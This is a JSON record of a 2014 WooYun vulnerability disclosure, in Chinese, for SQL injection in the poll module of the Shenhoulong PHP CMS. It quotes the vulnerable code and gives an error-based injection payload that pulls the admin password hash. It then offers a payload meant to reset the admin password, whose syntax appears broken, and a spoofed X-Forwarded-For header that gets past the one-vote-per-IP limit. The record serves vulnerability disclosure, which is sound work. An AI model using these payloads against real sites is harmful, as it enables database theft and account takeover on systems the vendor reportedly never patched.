{"id": 5747, "wybug_id": "wooyun-2014-048686", "wybug_title": "深喉咙CMS(shlcms PHP)SQL注射0day", "wybug_corp": "深喉咙CMS", "wybug_author": "数据流", "wybug_date": "2014-01-12 19:45", "wybug_open_date": "2014-02-26 19:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-02-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  （PS：这CMS的名字令人遐想)http://www.shenhoulong.com/ 隶属公司http://company.loooe.com/ 详细说明：  /Deepthroat/content/poll/ -> index.php\nif ($request['vtype']=='a')  57              {      58                  $db->query(\"UPDATE \".TB_PREFIX.\"poll SET num=num+1 WHERE id=\".$request['choice']);  59                    60                  $db->query(\"UPDATE \".TB_PREFIX.\"poll_category SET client_ip='\".$insert_ip.\"' WHERE id=\".$params['args']);  61                    62                  echo '<script>alert(\"æŠ•ç¥¨æˆåŠŸï¼\");window.location.href=\"'.$url.'\";</script>';  63              }  64              elseif ($request['vtype']=='b')  65              {  66                  for ($i=0;$i<count($request['choice']);$i++)  67                  {  68                   $db->query(\"UPDATE \".TB_PREFIX.\"poll SET num=num+1 WHERE id=\".$request['choice'][$i]);  69                  }  70                  $db->query(\"UPDATE \".TB_PREFIX.\"poll_category SET client_ip='\".$insert_ip.\"' WHERE id=\".$params['args']);  71                    72                  echo '<script>alert(\"投票成功\");window.location.href=\"'.$url.'\";</script>';  73              }  74          }\n投票处选项ID 参数choice没有做过滤就带入数据库查询导致注入漏洞的产生\n\nUPDATE注射 唯有用显错注射投票时抓包 choice参数改成SQL语句POC:\nand (select 1 from  (select count(*),concat((select ((select pwd from shl_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n\n密码很变态加密函数：/Deepthroat/inc/ -> class.shlencryption.php \n<?php    2  class shlEncryption   3  {   4      var $enstr = null;   5  \tfunction shlEncryption($str)   6      {   7          $this->enstr = $str;   8      }   9  \tfunction get_shal()  10      {  11          return sha1($this->enstr);  12      }  13  \tfunction get_md5()  14      {  15          return md5($this->enstr);  16      }  17  \tfunction get_jxqy3()  18      {  19          $tmpMS = $this->get_shal().$this->get_md5();  20          $tmpNewStr = substr($tmpMS,0,9).'s'.substr($tmpMS,10,9).'h'.substr($tmpMS,20,9).'l'.substr($tmpMS,30,9).'s'.substr($tmpMS,40,9).'u'.substr($tmpMS,50,9).'n'.substr  21  ($tmpMS,60,9).'y'.substr($tmpMS,70,2);  22          $tmpNewStr = substr($tmpNewStr,-36).substr($tmpNewStr,0,36);  23          $tmpNewStr = substr($tmpNewStr,0,70);  24          $tmpNewStr = substr($tmpNewStr,0,14).'j'.substr($tmpNewStr,14,14).'x'.substr($tmpNewStr,28,14).'q'.substr($tmpNewStr,32,14).'y'.substr($tmpNewStr,56,14).'3';  25          return $tmpNewStr;  26      }  27  \tfunction to_string()  28      {  29          $tmpstr = $this->get_jxqy3();  30          $tmpstr = substr($tmpstr,-35).substr($tmpstr,0,40);  31          return $tmpstr;  32      }  33  }  34  ?>\nSHA1加密的值加上MD5加密的值 然后各种substr HASH基本不能逆了运气好的可以去UPDATE一下密码把密码update成admin：\nand (select 1 from  (select count(*),concat((select ((update pwd = '33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj' where username='admin')) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);\n虽然密码解密不了 但还可以基于SQL注射进行下一步渗透可投票时候做了限制 只允许一个IP投票一次 也就代表一个IP只能执行一次SQL注射语句这对于进一步的渗透是很麻烦/Deepthroat/content/poll/ -> index.php\nif(!empty($request['vtype'])&&!empty($request['choice']))  33          {  34              $sql=\"SELECT * FROM \".TB_PREFIX.\"poll_category WHERE id=\".$params['args'];  35              $poll_client=$db->get_row($sql);  36              $cur_ip=getip();  37              if(empty($poll_client->client_ip))  38              {  39                  $insert_ip=$cur_ip;  40              }  41              else  42              {  43                  $checkIP=split(';',$poll_client->client_ip);  44                  if(in_array($cur_ip,$checkIP))  45                  {  46                      echo \"<script language='javascript'>alert('您已经投过票了!');window.history.go(-1);</script>\";  47                      exit;  48                  }  49                  array_push($checkIP,$cur_ip);  50                  $insert_ip=implode(';',$checkIP);  51              }\n看看getip()函数/Deepthroat/inc/function.php -> line 347\nfunction getip() 348  { 349      if(getenv('HTTP_CLIENT_IP')) 350      { 351          $client_ip = getenv('HTTP_CLIENT_IP'); 352      } 353      elseif(getenv('HTTP_X_FORWARDED_FOR')) 354      { 355          $client_ip = getenv('HTTP_X_FORWARDED_FOR'); 356      } 357      elseif(getenv('REMOTE_ADDR')) 358      { 359          $client_ip = getenv('REMOTE_ADDR'); 360      } 361      else 362      { 363          $client_ip = $HTTP_SERVER_VAR['REMOTE_ADDR']; 364      } 365      return ip2long($client_ip);\n那么利用X-FORWARDED-FOR可以伪造 从而突破限制X-FORWARDED-FOR: 8.8.8.8\n\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 数据流@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-01-13 09:23 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  为名字而来~    \n     2014-01-14 10:50 |    \t\t沦沦 \t\t\t( 普通白帽子  |\t\t\t        Rank:504 漏洞数:127        | 爱老婆，爱生活)\t\t \n  数据流好久没见    \n     2014-01-17 12:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  哈哈，怪不得我说最近为什么觉得在哪里看见一个深喉的字眼，洞主有内涵！    \n     2014-01-17 16:40 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @adm1n  我也为名字而发    \n     2014-01-17 16:41 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @沦沦 忙呀    \n     2014-02-26 20:48 |    \t\t乌云 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:14        | a)\t\t \n  为名而来    \n     2014-02-26 21:49 |    \t\ttSt \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:7        | 在开发里运维最强，运维里网络最强，网络里...)\t\t \n  这名字多了个咙    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}